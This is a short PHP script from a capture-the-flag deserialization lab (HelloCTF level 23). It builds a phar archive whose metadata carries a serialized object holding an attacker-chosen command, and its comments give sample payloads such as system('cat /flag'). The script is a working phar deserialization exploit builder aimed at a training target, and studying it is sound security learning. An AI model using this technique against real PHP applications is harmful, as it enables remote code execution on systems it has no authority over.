<?php
/*
--- HelloCTF - 反序列化靶场 关卡 23 : phar 构建辅助脚本 ---
本地运行:php -d phar.readonly=0 build_phar.php "system('cat /flag');"
或直接访问:build_phar.php?cmd=system('ls /');
© ProbiusOfficial(@hello-ctf.com) · github.com/ProbiusOfficial/PHPSerialize-labs
*/

class FLAG {
    public $helloctf_cmd;
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : (isset($argv[1]) ? $argv[1] : null);

if ($cmd === null) {
    echo '用法:?cmd=你的命令 (或命令行 php -d phar.readonly=0 build_phar.php "cmd")';
    exit;
}

$phar = new Phar(__DIR__ . '/helloctf.phar');
$phar->startBuffering();
$o = new FLAG();
$o->helloctf_cmd = $cmd;
$phar->setMetadata($o);
$phar->addFromString('readme.txt', 'helloctf');
$phar->stopBuffering();
echo 'built: helloctf.phar (metadata = FLAG{helloctf_cmd="' . htmlspecialchars($cmd) . '"})';
